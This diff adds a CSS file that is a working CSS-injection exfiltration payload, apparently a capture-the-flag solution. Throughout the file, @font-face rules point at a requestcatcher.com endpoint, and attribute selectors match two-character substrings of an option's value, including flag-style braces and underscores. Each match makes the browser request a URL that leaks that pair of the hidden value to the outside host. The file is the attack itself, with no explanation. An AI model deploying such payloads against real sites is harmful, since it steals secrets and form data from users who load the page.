@@ -1,0 +1,1682 @@
+@charset "UTF-8";
+
+@font-face {
+    font-family: "pair-ae";
+    src: url('https://css_task_test.requestcatcher.com/flag?ae');
+}
+p:nth-of-type(4) option[value*="ae"] {
+    font-family: "pair-ae";
+}
+@font-face {
+    font-family: "pair-ah";
+    src: url('https://css_task_test.requestcatcher.com/flag?ah');
+}
+p:nth-of-type(4) option[value*="ah"] {
+    font-family: "pair-ah";
+}
+@font-face {
+    font-family: "pair-ag";
+    src: url('https://css_task_test.requestcatcher.com/flag?ag');
+}
+p:nth-of-type(4) option[value*="ag"] {
+    font-family: "pair-ag";
+}
+@font-face {
+    font-family: "pair-ak";
+    src: url('https://css_task_test.requestcatcher.com/flag?ak');
+}
+p:nth-of-type(4) option[value*="ak"] {
+    font-family: "pair-ak";
+}
+@font-face {
+    font-family: "pair-ai";
+    src: url('https://css_task_test.requestcatcher.com/flag?ai');
+}
+p:nth-of-type(4) option[value*="ai"] {
+    font-family: "pair-ai";
+}
+@font-face {
+    font-family: "pair-al";
+    src: url('https://css_task_test.requestcatcher.com/flag?al');
+}
+p:nth-of-type(4) option[value*="al"] {
+    font-family: "pair-al";
+}
+@font-face {
+    font-family: "pair-as";
+    src: url('https://css_task_test.requestcatcher.com/flag?as');
+}
+p:nth-of-type(4) option[value*="as"] {
+    font-family: "pair-as";
+}
+@font-face {
+    font-family: "pair-ao";
+    src: url('https://css_task_test.requestcatcher.com/flag?ao');
+}
+p:nth-of-type(4) option[value*="ao"] {
+    font-family: "pair-ao";
+}
+@font-face {
+    font-family: "pair-ap";
+    src: url('https://css_task_test.requestcatcher.com/flag?ap');
+}
+p:nth-of-type(4) option[value*="ap"] {
+    font-family: "pair-ap";
+}
+@font-face {
+    font-family: "pair-at";
+    src: url('https://css_task_test.requestcatcher.com/flag?at');
+}
+p:nth-of-type(4) option[value*="at"] {
+    font-family: "pair-at";
+}
+@font-face {
+    font-family: "pair-a{";
+    src: url('https://css_task_test.requestcatcher.com/flag?a%7B');
+}
+p:nth-of-type(4) option[value*="a{"] {
+    font-family: "pair-a{";
+}
+@font-face {
+    font-family: "pair-a_";
+    src: url('https://css_task_test.requestcatcher.com/flag?a_');
+}
+p:nth-of-type(4) option[value*="a_"] {
+    font-family: "pair-a_";
+}
+@font-face {
+    font-family: "pair-a}";
+    src: url('https://css_task_test.requestcatcher.com/flag?a%7D');
+}
+p:nth-of-type(4) option[value*="a}"] {
+    font-family: "pair-a}";
+}
+@font-face {
+    font-family: "pair-ax";
+    src: url('https://css_task_test.requestcatcher.com/flag?ax');
+}
+p:nth-of-type(4) option[value*="ax"] {
+    font-family: "pair-ax";
+}
+@font-face {
+    font-family: "pair-av";
+    src: url('https://css_task_test.requestcatcher.com/flag?av');
+}
+p:nth-of-type(4) option[value*="av"] {
+    font-family: "pair-av";
+}
+@font-face {
+    font-family: "pair-ea";
+    src: url('https://css_task_test.requestcatcher.com/flag?ea');
+}
+p:nth-of-type(4) option[value*="ea"] {
+    font-family: "pair-ea";
+}
+@font-face {
+    font-family: "pair-eh";
+    src: url('https://css_task_test.requestcatcher.com/flag?eh');
+}
+p:nth-of-type(4) option[value*="eh"] {
+    font-family: "pair-eh";
+}
+@font-face {
+    font-family: "pair-eg";
+    src: url('https://css_task_test.requestcatcher.com/flag?eg');
+}
+p:nth-of-type(4) option[value*="eg"] {
+    font-family: "pair-eg";
+}
+@font-face {
+    font-family: "pair-ek";
+    src: url('https://css_task_test.requestcatcher.com/flag?ek');
+}
+p:nth-of-type(4) option[value*="ek"] {
+    font-family: "pair-ek";
+}
+@font-face {
+    font-family: "pair-ei";
+    src: url('https://css_task_test.requestcatcher.com/flag?ei');
+}
+p:nth-of-type(4) option[value*="ei"] {
+    font-family: "pair-ei";
+}
+@font-face {
+    font-family: "pair-el";
+    src: url('https://css_task_test.requestcatcher.com/flag?el');
+}
+p:nth-of-type(4) option[value*="el"] {
+    font-family: "pair-el";
+}
+@font-face {
+    font-family: "pair-es";
+    src: url('https://css_task_test.requestcatcher.com/flag?es');
+}
+p:nth-of-type(4) option[value*="es"] {
+    font-family: "pair-es";
+}
+@font-face {
+    font-family: "pair-eo";
+    src: url('https://css_task_test.requestcatcher.com/flag?eo');
+}
+p:nth-of-type(4) option[value*="eo"] {
+    font-family: "pair-eo";
+}
+@font-face {
+    font-family: "pair-ep";
+    src: url('https://css_task_test.requestcatcher.com/flag?ep');
+}
+p:nth-of-type(4) option[value*="ep"] {
+    font-family: "pair-ep";
+}
+@font-face {
+    font-family: "pair-et";
+    src: url('https://css_task_test.requestcatcher.com/flag?et');
+}
+p:nth-of-type(4) option[value*="et"] {
+    font-family: "pair-et";
+}
+@font-face {
+    font-family: "pair-e{";
+    src: url('https://css_task_test.requestcatcher.com/flag?e%7B');
+}
+p:nth-of-type(4) option[value*="e{"] {
+    font-family: "pair-e{";
+}
+@font-face {
+    font-family: "pair-e_";
+    src: url('https://css_task_test.requestcatcher.com/flag?e_');
+}
+p:nth-of-type(4) option[value*="e_"] {
+    font-family: "pair-e_";
+}
+@font-face {
+    font-family: "pair-e}";
+    src: url('https://css_task_test.requestcatcher.com/flag?e%7D');
+}
+p:nth-of-type(4) option[value*="e}"] {
+    font-family: "pair-e}";
+}
+@font-face {
+    font-family: "pair-ex";
+    src: url('https://css_task_test.requestcatcher.com/flag?ex');
+}
+p:nth-of-type(4) option[value*="ex"] {
+    font-family: "pair-ex";
+}
+@font-face {
+    font-family: "pair-ev";
+    src: url('https://css_task_test.requestcatcher.com/flag?ev');
+}
+p:nth-of-type(4) option[value*="ev"] {
+    font-family: "pair-ev";
+}
+@font-face {
+    font-family: "pair-ha";
+    src: url('https://css_task_test.requestcatcher.com/flag?ha');
+}
+p:nth-of-type(4) option[value*="ha"] {
+    font-family: "pair-ha";
+}
+@font-face {
+    font-family: "pair-he";
+    src: url('https://css_task_test.requestcatcher.com/flag?he');
+}
+p:nth-of-type(4) option[value*="he"] {
+    font-family: "pair-he";
+}
+@font-face {
+    font-family: "pair-hg";
+    src: url('https://css_task_test.requestcatcher.com/flag?hg');
+}
+p:nth-of-type(4) option[value*="hg"] {
+    font-family: "pair-hg";
+}
+@font-face {
+    font-family: "pair-hk";
+    src: url('https://css_task_test.requestcatcher.com/flag?hk');
+}
+p:nth-of-type(4) option[value*="hk"] {
+    font-family: "pair-hk";
+}
+@font-face {
+    font-family: "pair-hi";
+    src: url('https://css_task_test.requestcatcher.com/flag?hi');
+}
+p:nth-of-type(4) option[value*="hi"] {
+    font-family: "pair-hi";
+}
+@font-face {
+    font-family: "pair-hl";
+    src: url('https://css_task_test.requestcatcher.com/flag?hl');
+}
+p:nth-of-type(4) option[value*="hl"] {
+    font-family: "pair-hl";
+}
+@font-face {
+    font-family: "pair-hs";
+    src: url('https://css_task_test.requestcatcher.com/flag?hs');
+}
+p:nth-of-type(4) option[value*="hs"] {
+    font-family: "pair-hs";
+}
+@font-face {
+    font-family: "pair-ho";
+    src: url('https://css_task_test.requestcatcher.com/flag?ho');
+}
+p:nth-of-type(4) option[value*="ho"] {
+    font-family: "pair-ho";
+}
+@font-face {
+    font-family: "pair-hp";
+    src: url('https://css_task_test.requestcatcher.com/flag?hp');
+}
+p:nth-of-type(4) option[value*="hp"] {
+    font-family: "pair-hp";
+}
+@font-face {
+    font-family: "pair-ht";
+    src: url('https://css_task_test.requestcatcher.com/flag?ht');
+}
+p:nth-of-type(4) option[value*="ht"] {
+    font-family: "pair-ht";
+}
+@font-face {
+    font-family: "pair-h{";
+    src: url('https://css_task_test.requestcatcher.com/flag?h%7B');
+}
+p:nth-of-type(4) option[value*="h{"] {
+    font-family: "pair-h{";
+}
+@font-face {
+    font-family: "pair-h_";
+    src: url('https://css_task_test.requestcatcher.com/flag?h_');
+}
+p:nth-of-type(4) option[value*="h_"] {
+    font-family: "pair-h_";
+}
+@font-face {
+    font-family: "pair-h}";
+    src: url('https://css_task_test.requestcatcher.com/flag?h%7D');
+}
+p:nth-of-type(4) option[value*="h}"] {
+    font-family: "pair-h}";
+}
+@font-face {
+    font-family: "pair-hx";
+    src: url('https://css_task_test.requestcatcher.com/flag?hx');
+}
+p:nth-of-type(4) option[value*="hx"] {
+    font-family: "pair-hx";
+}
+@font-face {
+    font-family: "pair-hv";
+    src: url('https://css_task_test.requestcatcher.com/flag?hv');
+}
+p:nth-of-type(4) option[value*="hv"] {
+    font-family: "pair-hv";
+}
+@font-face {
+    font-family: "pair-ga";
+    src: url('https://css_task_test.requestcatcher.com/flag?ga');
+}
+p:nth-of-type(4) option[value*="ga"] {
+    font-family: "pair-ga";
+}
+@font-face {
+    font-family: "pair-ge";
+    src: url('https://css_task_test.requestcatcher.com/flag?ge');
+}
+p:nth-of-type(4) option[value*="ge"] {
+    font-family: "pair-ge";
+}
+@font-face {
+    font-family: "pair-gh";
+    src: url('https://css_task_test.requestcatcher.com/flag?gh');
+}
+p:nth-of-type(4) option[value*="gh"] {
+    font-family: "pair-gh";
+}
+@font-face {
+    font-family: "pair-gk";
+    src: url('https://css_task_test.requestcatcher.com/flag?gk');
+}
+p:nth-of-type(4) option[value*="gk"] {
+    font-family: "pair-gk";
+}
+@font-face {
+    font-family: "pair-gi";
+    src: url('https://css_task_test.requestcatcher.com/flag?gi');
+}
+p:nth-of-type(4) option[value*="gi"] {
+    font-family: "pair-gi";
+}
+@font-face {
+    font-family: "pair-gl";
+    src: url('https://css_task_test.requestcatcher.com/flag?gl');
+}
+p:nth-of-type(4) option[value*="gl"] {
+    font-family: "pair-gl";
+}
+@font-face {
+    font-family: "pair-gs";
+    src: url('https://css_task_test.requestcatcher.com/flag?gs');
+}
+p:nth-of-type(4) option[value*="gs"] {
+    font-family: "pair-gs";
+}
+@font-face {
+    font-family: "pair-go";
+    src: url('https://css_task_test.requestcatcher.com/flag?go');
+}
+p:nth-of-type(4) option[value*="go"] {
+    font-family: "pair-go";
+}
+@font-face {
+    font-family: "pair-gp";
+    src: url('https://css_task_test.requestcatcher.com/flag?gp');
+}
+p:nth-of-type(4) option[value*="gp"] {
+    font-family: "pair-gp";
+}
+@font-face {
+    font-family: "pair-gt";
+    src: url('https://css_task_test.requestcatcher.com/flag?gt');
+}
+p:nth-of-type(4) option[value*="gt"] {
+    font-family: "pair-gt";
+}
+@font-face {
+    font-family: "pair-g{";
+    src: url('https://css_task_test.requestcatcher.com/flag?g%7B');
+}
+p:nth-of-type(4) option[value*="g{"] {
+    font-family: "pair-g{";
+}
+@font-face {
+    font-family: "pair-g_";
+    src: url('https://css_task_test.requestcatcher.com/flag?g_');
+}
+p:nth-of-type(4) option[value*="g_"] {
+    font-family: "pair-g_";
+}
+@font-face {
+    font-family: "pair-g}";
+    src: url('https://css_task_test.requestcatcher.com/flag?g%7D');
+}
+p:nth-of-type(4) option[value*="g}"] {
+    font-family: "pair-g}";
+}
+@font-face {
+    font-family: "pair-gx";
+    src: url('https://css_task_test.requestcatcher.com/flag?gx');
+}
+p:nth-of-type(4) option[value*="gx"] {
+    font-family: "pair-gx";
+}
+@font-face {
+    font-family: "pair-gv";
+    src: url('https://css_task_test.requestcatcher.com/flag?gv');
+}
+p:nth-of-type(4) option[value*="gv"] {
+    font-family: "pair-gv";
+}
+@font-face {
+    font-family: "pair-ka";
+    src: url('https://css_task_test.requestcatcher.com/flag?ka');
+}
+p:nth-of-type(4) option[value*="ka"] {
+    font-family: "pair-ka";
+}
+@font-face {
+    font-family: "pair-ke";
+    src: url('https://css_task_test.requestcatcher.com/flag?ke');
+}
+p:nth-of-type(4) option[value*="ke"] {
+    font-family: "pair-ke";
+}
+@font-face {
+    font-family: "pair-kh";
+    src: url('https://css_task_test.requestcatcher.com/flag?kh');
+}
+p:nth-of-type(4) option[value*="kh"] {
+    font-family: "pair-kh";
+}
+@font-face {
+    font-family: "pair-kg";
+    src: url('https://css_task_test.requestcatcher.com/flag?kg');
+}
+p:nth-of-type(4) option[value*="kg"] {
+    font-family: "pair-kg";
+}
+@font-face {
+    font-family: "pair-ki";
+    src: url('https://css_task_test.requestcatcher.com/flag?ki');
+}
+p:nth-of-type(4) option[value*="ki"] {
+    font-family: "pair-ki";
+}
+@font-face {
+    font-family: "pair-kl";
+    src: url('https://css_task_test.requestcatcher.com/flag?kl');
+}
+p:nth-of-type(4) option[value*="kl"] {
+    font-family: "pair-kl";
+}
+@font-face {
+    font-family: "pair-ks";
+    src: url('https://css_task_test.requestcatcher.com/flag?ks');
+}
+p:nth-of-type(4) option[value*="ks"] {
+    font-family: "pair-ks";
+}
+@font-face {
+    font-family: "pair-ko";
+    src: url('https://css_task_test.requestcatcher.com/flag?ko');
+}
+p:nth-of-type(4) option[value*="ko"] {
+    font-family: "pair-ko";
+}
+@font-face {
+    font-family: "pair-kp";
+    src: url('https://css_task_test.requestcatcher.com/flag?kp');
+}
+p:nth-of-type(4) option[value*="kp"] {
+    font-family: "pair-kp";
+}
+@font-face {
+    font-family: "pair-kt";
+    src: url('https://css_task_test.requestcatcher.com/flag?kt');
+}
+p:nth-of-type(4) option[value*="kt"] {
+    font-family: "pair-kt";
+}
+@font-face {
+    font-family: "pair-k{";
+    src: url('https://css_task_test.requestcatcher.com/flag?k%7B');
+}
+p:nth-of-type(4) option[value*="k{"] {
+    font-family: "pair-k{";
+}
+@font-face {
+    font-family: "pair-k_";
+    src: url('https://css_task_test.requestcatcher.com/flag?k_');
+}
+p:nth-of-type(4) option[value*="k_"] {
+    font-family: "pair-k_";
+}
+@font-face {
+    font-family: "pair-k}";
+    src: url('https://css_task_test.requestcatcher.com/flag?k%7D');
+}
+p:nth-of-type(4) option[value*="k}"] {
+    font-family: "pair-k}";
+}
+@font-face {
+    font-family: "pair-kx";
+    src: url('https://css_task_test.requestcatcher.com/flag?kx');
+}
+p:nth-of-type(4) option[value*="kx"] {
+    font-family: "pair-kx";
+}
+@font-face {
+    font-family: "pair-kv";
+    src: url('https://css_task_test.requestcatcher.com/flag?kv');
+}
+p:nth-of-type(4) option[value*="kv"] {
+    font-family: "pair-kv";
+}
+@font-face {
+    font-family: "pair-ia";
+    src: url('https://css_task_test.requestcatcher.com/flag?ia');
+}
+p:nth-of-type(4) option[value*="ia"] {
+    font-family: "pair-ia";
+}
+@font-face {
+    font-family: "pair-ie";
+    src: url('https://css_task_test.requestcatcher.com/flag?ie');
+}
+p:nth-of-type(4) option[value*="ie"] {
+    font-family: "pair-ie";
+}
+@font-face {
+    font-family: "pair-ih";
+    src: url('https://css_task_test.requestcatcher.com/flag?ih');
+}
+p:nth-of-type(4) option[value*="ih"] {
+    font-family: "pair-ih";
+}
+@font-face {
+    font-family: "pair-ig";
+    src: url('https://css_task_test.requestcatcher.com/flag?ig');
+}
+p:nth-of-type(4) option[value*="ig"] {
+    font-family: "pair-ig";
+}
+@font-face {
+    font-family: "pair-ik";
+    src: url('https://css_task_test.requestcatcher.com/flag?ik');
+}
+p:nth-of-type(4) option[value*="ik"] {
+    font-family: "pair-ik";
+}
+@font-face {
+    font-family: "pair-il";
+    src: url('https://css_task_test.requestcatcher.com/flag?il');
+}
+p:nth-of-type(4) option[value*="il"] {
+    font-family: "pair-il";
+}
+@font-face {
+    font-family: "pair-is";
+    src: url('https://css_task_test.requestcatcher.com/flag?is');
+}
+p:nth-of-type(4) option[value*="is"] {
+    font-family: "pair-is";
+}
+@font-face {
+    font-family: "pair-io";
+    src: url('https://css_task_test.requestcatcher.com/flag?io');
+}
+p:nth-of-type(4) option[value*="io"] {
+    font-family: "pair-io";
+}
+@font-face {
+    font-family: "pair-ip";
+    src: url('https://css_task_test.requestcatcher.com/flag?ip');
+}
+p:nth-of-type(4) option[value*="ip"] {
+    font-family: "pair-ip";
+}
+@font-face {
+    font-family: "pair-it";
+    src: url('https://css_task_test.requestcatcher.com/flag?it');
+}
+p:nth-of-type(4) option[value*="it"] {
+    font-family: "pair-it";
+}
+@font-face {
+    font-family: "pair-i{";
+    src: url('https://css_task_test.requestcatcher.com/flag?i%7B');
+}
+p:nth-of-type(4) option[value*="i{"] {
+    font-family: "pair-i{";
+}
+@font-face {
+    font-family: "pair-i_";
+    src: url('https://css_task_test.requestcatcher.com/flag?i_');
+}
+p:nth-of-type(4) option[value*="i_"] {
+    font-family: "pair-i_";
+}
+@font-face {
+    font-family: "pair-i}";
+    src: url('https://css_task_test.requestcatcher.com/flag?i%7D');
+}
+p:nth-of-type(4) option[value*="i}"] {
+    font-family: "pair-i}";
+}
+@font-face {
+    font-family: "pair-ix";
+    src: url('https://css_task_test.requestcatcher.com/flag?ix');
+}
+p:nth-of-type(4) option[value*="ix"] {
+    font-family: "pair-ix";
+}
+@font-face {
+    font-family: "pair-iv";
+    src: url('https://css_task_test.requestcatcher.com/flag?iv');
+}
+p:nth-of-type(4) option[value*="iv"] {
+    font-family: "pair-iv";
+}
+@font-face {
+    font-family: "pair-la";
+    src: url('https://css_task_test.requestcatcher.com/flag?la');
+}
+p:nth-of-type(4) option[value*="la"] {
+    font-family: "pair-la";
+}
+@font-face {
+    font-family: "pair-le";
+    src: url('https://css_task_test.requestcatcher.com/flag?le');
+}
+p:nth-of-type(4) option[value*="le"] {
+    font-family: "pair-le";
+}
+@font-face {
+    font-family: "pair-lh";
+    src: url('https://css_task_test.requestcatcher.com/flag?lh');
+}
+p:nth-of-type(4) option[value*="lh"] {
+    font-family: "pair-lh";
+}
+@font-face {
+    font-family: "pair-lg";
+    src: url('https://css_task_test.requestcatcher.com/flag?lg');
+}
+p:nth-of-type(4) option[value*="lg"] {
+    font-family: "pair-lg";
+}
+@font-face {
+    font-family: "pair-lk";
+    src: url('https://css_task_test.requestcatcher.com/flag?lk');
+}
+p:nth-of-type(4) option[value*="lk"] {
+    font-family: "pair-lk";
+}
+@font-face {
+    font-family: "pair-li";
+    src: url('https://css_task_test.requestcatcher.com/flag?li');
+}
+p:nth-of-type(4) option[value*="li"] {
+    font-family: "pair-li";
+}
+@font-face {
+    font-family: "pair-ls";
+    src: url('https://css_task_test.requestcatcher.com/flag?ls');
+}
+p:nth-of-type(4) option[value*="ls"] {
+    font-family: "pair-ls";
+}
+@font-face {
+    font-family: "pair-lo";
+    src: url('https://css_task_test.requestcatcher.com/flag?lo');
+}
+p:nth-of-type(4) option[value*="lo"] {
+    font-family: "pair-lo";
+}
+@font-face {
+    font-family: "pair-lp";
+    src: url('https://css_task_test.requestcatcher.com/flag?lp');
+}
+p:nth-of-type(4) option[value*="lp"] {
+    font-family: "pair-lp";
+}
+@font-face {
+    font-family: "pair-lt";
+    src: url('https://css_task_test.requestcatcher.com/flag?lt');
+}
+p:nth-of-type(4) option[value*="lt"] {
+    font-family: "pair-lt";
+}
+@font-face {
+    font-family: "pair-l{";
+    src: url('https://css_task_test.requestcatcher.com/flag?l%7B');
+}
+p:nth-of-type(4) option[value*="l{"] {
+    font-family: "pair-l{";
+}
+@font-face {
+    font-family: "pair-l_";
+    src: url('https://css_task_test.requestcatcher.com/flag?l_');
+}
+p:nth-of-type(4) option[value*="l_"] {
+    font-family: "pair-l_";
+}
+@font-face {
+    font-family: "pair-l}";
+    src: url('https://css_task_test.requestcatcher.com/flag?l%7D');
+}
+p:nth-of-type(4) option[value*="l}"] {
+    font-family: "pair-l}";
+}
+@font-face {
+    font-family: "pair-lx";
+    src: url('https://css_task_test.requestcatcher.com/flag?lx');
+}
+p:nth-of-type(4) option[value*="lx"] {
+    font-family: "pair-lx";
+}
+@font-face {
+    font-family: "pair-lv";
+    src: url('https://css_task_test.requestcatcher.com/flag?lv');
+}
+p:nth-of-type(4) option[value*="lv"] {
+    font-family: "pair-lv";
+}
+@font-face {
+    font-family: "pair-sa";
+    src: url('https://css_task_test.requestcatcher.com/flag?sa');
+}
+p:nth-of-type(4) option[value*="sa"] {
+    font-family: "pair-sa";
+}
+@font-face {
+    font-family: "pair-se";
+    src: url('https://css_task_test.requestcatcher.com/flag?se');
+}
+p:nth-of-type(4) option[value*="se"] {
+    font-family: "pair-se";
+}
+@font-face {
+    font-family: "pair-sh";
+    src: url('https://css_task_test.requestcatcher.com/flag?sh');
+}
+p:nth-of-type(4) option[value*="sh"] {
+    font-family: "pair-sh";
+}
+@font-face {
+    font-family: "pair-sg";
+    src: url('https://css_task_test.requestcatcher.com/flag?sg');
+}
+p:nth-of-type(4) option[value*="sg"] {
+    font-family: "pair-sg";
+}
+@font-face {
+    font-family: "pair-sk";
+    src: url('https://css_task_test.requestcatcher.com/flag?sk');
+}
+p:nth-of-type(4) option[value*="sk"] {
+    font-family: "pair-sk";
+}
+@font-face {
+    font-family: "pair-si";
+    src: url('https://css_task_test.requestcatcher.com/flag?si');
+}
+p:nth-of-type(4) option[value*="si"] {
+    font-family: "pair-si";
+}
+@font-face {
+    font-family: "pair-sl";
+    src: url('https://css_task_test.requestcatcher.com/flag?sl');
+}
+p:nth-of-type(4) option[value*="sl"] {
+    font-family: "pair-sl";
+}
+@font-face {
+    font-family: "pair-so";
+    src: url('https://css_task_test.requestcatcher.com/flag?so');
+}
+p:nth-of-type(4) option[value*="so"] {
+    font-family: "pair-so";
+}
+@font-face {
+    font-family: "pair-sp";
+    src: url('https://css_task_test.requestcatcher.com/flag?sp');
+}
+p:nth-of-type(4) option[value*="sp"] {
+    font-family: "pair-sp";
+}
+@font-face {
+    font-family: "pair-st";
+    src: url('https://css_task_test.requestcatcher.com/flag?st');
+}
+p:nth-of-type(4) option[value*="st"] {
+    font-family: "pair-st";
+}
+@font-face {
+    font-family: "pair-s{";
+    src: url('https://css_task_test.requestcatcher.com/flag?s%7B');
+}
+p:nth-of-type(4) option[value*="s{"] {
+    font-family: "pair-s{";
+}
+@font-face {
+    font-family: "pair-s_";
+    src: url('https://css_task_test.requestcatcher.com/flag?s_');
+}
+p:nth-of-type(4) option[value*="s_"] {
+    font-family: "pair-s_";
+}
+@font-face {
+    font-family: "pair-s}";
+    src: url('https://css_task_test.requestcatcher.com/flag?s%7D');
+}
+p:nth-of-type(4) option[value*="s}"] {
+    font-family: "pair-s}";
+}
+@font-face {
+    font-family: "pair-sx";
+    src: url('https://css_task_test.requestcatcher.com/flag?sx');
+}
+p:nth-of-type(4) option[value*="sx"] {
+    font-family: "pair-sx";
+}
+@font-face {
+    font-family: "pair-sv";
+    src: url('https://css_task_test.requestcatcher.com/flag?sv');
+}
+p:nth-of-type(4) option[value*="sv"] {
+    font-family: "pair-sv";
+}
+@font-face {
+    font-family: "pair-oa";
+    src: url('https://css_task_test.requestcatcher.com/flag?oa');
+}
+p:nth-of-type(4) option[value*="oa"] {
+    font-family: "pair-oa";
+}
+@font-face {
+    font-family: "pair-oe";
+    src: url('https://css_task_test.requestcatcher.com/flag?oe');
+}
+p:nth-of-type(4) option[value*="oe"] {
+    font-family: "pair-oe";
+}
+@font-face {
+    font-family: "pair-oh";
+    src: url('https://css_task_test.requestcatcher.com/flag?oh');
+}
+p:nth-of-type(4) option[value*="oh"] {
+    font-family: "pair-oh";
+}
+@font-face {
+    font-family: "pair-og";
+    src: url('https://css_task_test.requestcatcher.com/flag?og');
+}
+p:nth-of-type(4) option[value*="og"] {
+    font-family: "pair-og";
+}
+@font-face {
+    font-family: "pair-ok";
+    src: url('https://css_task_test.requestcatcher.com/flag?ok');
+}
+p:nth-of-type(4) option[value*="ok"] {
+    font-family: "pair-ok";
+}
+@font-face {
+    font-family: "pair-oi";
+    src: url('https://css_task_test.requestcatcher.com/flag?oi');
+}
+p:nth-of-type(4) option[value*="oi"] {
+    font-family: "pair-oi";
+}
+@font-face {
+    font-family: "pair-ol";
+    src: url('https://css_task_test.requestcatcher.com/flag?ol');
+}
+p:nth-of-type(4) option[value*="ol"] {
+    font-family: "pair-ol";
+}
+@font-face {
+    font-family: "pair-os";
+    src: url('https://css_task_test.requestcatcher.com/flag?os');
+}
+p:nth-of-type(4) option[value*="os"] {
+    font-family: "pair-os";
+}
+@font-face {
+    font-family: "pair-op";
+    src: url('https://css_task_test.requestcatcher.com/flag?op');
+}
+p:nth-of-type(4) option[value*="op"] {
+    font-family: "pair-op";
+}
+@font-face {
+    font-family: "pair-ot";
+    src: url('https://css_task_test.requestcatcher.com/flag?ot');
+}
+p:nth-of-type(4) option[value*="ot"] {
+    font-family: "pair-ot";
+}
+@font-face {
+    font-family: "pair-o{";
+    src: url('https://css_task_test.requestcatcher.com/flag?o%7B');
+}
+p:nth-of-type(4) option[value*="o{"] {
+    font-family: "pair-o{";
+}
+@font-face {
+    font-family: "pair-o_";
+    src: url('https://css_task_test.requestcatcher.com/flag?o_');
+}
+p:nth-of-type(4) option[value*="o_"] {
+    font-family: "pair-o_";
+}
+@font-face {
+    font-family: "pair-o}";
+    src: url('https://css_task_test.requestcatcher.com/flag?o%7D');
+}
+p:nth-of-type(4) option[value*="o}"] {
+    font-family: "pair-o}";
+}
+@font-face {
+    font-family: "pair-ox";
+    src: url('https://css_task_test.requestcatcher.com/flag?ox');
+}
+p:nth-of-type(4) option[value*="ox"] {
+    font-family: "pair-ox";
+}
+@font-face {
+    font-family: "pair-ov";
+    src: url('https://css_task_test.requestcatcher.com/flag?ov');
+}
+p:nth-of-type(4) option[value*="ov"] {
+    font-family: "pair-ov";
+}
+@font-face {
+    font-family: "pair-pa";
+    src: url('https://css_task_test.requestcatcher.com/flag?pa');
+}
+p:nth-of-type(4) option[value*="pa"] {
+    font-family: "pair-pa";
+}
+@font-face {
+    font-family: "pair-pe";
+    src: url('https://css_task_test.requestcatcher.com/flag?pe');
+}
+p:nth-of-type(4) option[value*="pe"] {
+    font-family: "pair-pe";
+}
+@font-face {
+    font-family: "pair-ph";
+    src: url('https://css_task_test.requestcatcher.com/flag?ph');
+}
+p:nth-of-type(4) option[value*="ph"] {
+    font-family: "pair-ph";
+}
+@font-face {
+    font-family: "pair-pg";
+    src: url('https://css_task_test.requestcatcher.com/flag?pg');
+}
+p:nth-of-type(4) option[value*="pg"] {
+    font-family: "pair-pg";
+}
+@font-face {
+    font-family: "pair-pk";
+    src: url('https://css_task_test.requestcatcher.com/flag?pk');
+}
+p:nth-of-type(4) option[value*="pk"] {
+    font-family: "pair-pk";
+}
+@font-face {
+    font-family: "pair-pi";
+    src: url('https://css_task_test.requestcatcher.com/flag?pi');
+}
+p:nth-of-type(4) option[value*="pi"] {
+    font-family: "pair-pi";
+}
+@font-face {
+    font-family: "pair-pl";
+    src: url('https://css_task_test.requestcatcher.com/flag?pl');
+}
+p:nth-of-type(4) option[value*="pl"] {
+    font-family: "pair-pl";
+}
+@font-face {
+    font-family: "pair-ps";
+    src: url('https://css_task_test.requestcatcher.com/flag?ps');
+}
+p:nth-of-type(4) option[value*="ps"] {
+    font-family: "pair-ps";
+}
+@font-face {
+    font-family: "pair-po";
+    src: url('https://css_task_test.requestcatcher.com/flag?po');
+}
+p:nth-of-type(4) option[value*="po"] {
+    font-family: "pair-po";
+}
+@font-face {
+    font-family: "pair-pt";
+    src: url('https://css_task_test.requestcatcher.com/flag?pt');
+}
+p:nth-of-type(4) option[value*="pt"] {
+    font-family: "pair-pt";
+}
+@font-face {
+    font-family: "pair-p{";
+    src: url('https://css_task_test.requestcatcher.com/flag?p%7B');
+}
+p:nth-of-type(4) option[value*="p{"] {
+    font-family: "pair-p{";
+}
+@font-face {
+    font-family: "pair-p_";
+    src: url('https://css_task_test.requestcatcher.com/flag?p_');
+}
+p:nth-of-type(4) option[value*="p_"] {
+    font-family: "pair-p_";
+}
+@font-face {
+    font-family: "pair-p}";
+    src: url('https://css_task_test.requestcatcher.com/flag?p%7D');
+}
+p:nth-of-type(4) option[value*="p}"] {
+    font-family: "pair-p}";
+}
+@font-face {
+    font-family: "pair-px";
+    src: url('https://css_task_test.requestcatcher.com/flag?px');
+}
+p:nth-of-type(4) option[value*="px"] {
+    font-family: "pair-px";
+}
+@font-face {
+    font-family: "pair-pv";
+    src: url('https://css_task_test.requestcatcher.com/flag?pv');
+}
+p:nth-of-type(4) option[value*="pv"] {
+    font-family: "pair-pv";
+}
+@font-face {
+    font-family: "pair-ta";
+    src: url('https://css_task_test.requestcatcher.com/flag?ta');
+}
+p:nth-of-type(4) option[value*="ta"] {
+    font-family: "pair-ta";
+}
+@font-face {
+    font-family: "pair-te";
+    src: url('https://css_task_test.requestcatcher.com/flag?te');
+}
+p:nth-of-type(4) option[value*="te"] {
+    font-family: "pair-te";
+}
+@font-face {
+    font-family: "pair-th";
+    src: url('https://css_task_test.requestcatcher.com/flag?th');
+}
+p:nth-of-type(4) option[value*="th"] {
+    font-family: "pair-th";
+}
+@font-face {
+    font-family: "pair-tg";
+    src: url('https://css_task_test.requestcatcher.com/flag?tg');
+}
+p:nth-of-type(4) option[value*="tg"] {
+    font-family: "pair-tg";
+}
+@font-face {
+    font-family: "pair-tk";
+    src: url('https://css_task_test.requestcatcher.com/flag?tk');
+}
+p:nth-of-type(4) option[value*="tk"] {
+    font-family: "pair-tk";
+}
+@font-face {
+    font-family: "pair-ti";
+    src: url('https://css_task_test.requestcatcher.com/flag?ti');
+}
+p:nth-of-type(4) option[value*="ti"] {
+    font-family: "pair-ti";
+}
+@font-face {
+    font-family: "pair-tl";
+    src: url('https://css_task_test.requestcatcher.com/flag?tl');
+}
+p:nth-of-type(4) option[value*="tl"] {
+    font-family: "pair-tl";
+}
+@font-face {
+    font-family: "pair-ts";
+    src: url('https://css_task_test.requestcatcher.com/flag?ts');
+}
+p:nth-of-type(4) option[value*="ts"] {
+    font-family: "pair-ts";
+}
+@font-face {
+    font-family: "pair-to";
+    src: url('https://css_task_test.requestcatcher.com/flag?to');
+}
+p:nth-of-type(4) option[value*="to"] {
+    font-family: "pair-to";
+}
+@font-face {
+    font-family: "pair-tp";
+    src: url('https://css_task_test.requestcatcher.com/flag?tp');
+}
+p:nth-of-type(4) option[value*="tp"] {
+    font-family: "pair-tp";
+}
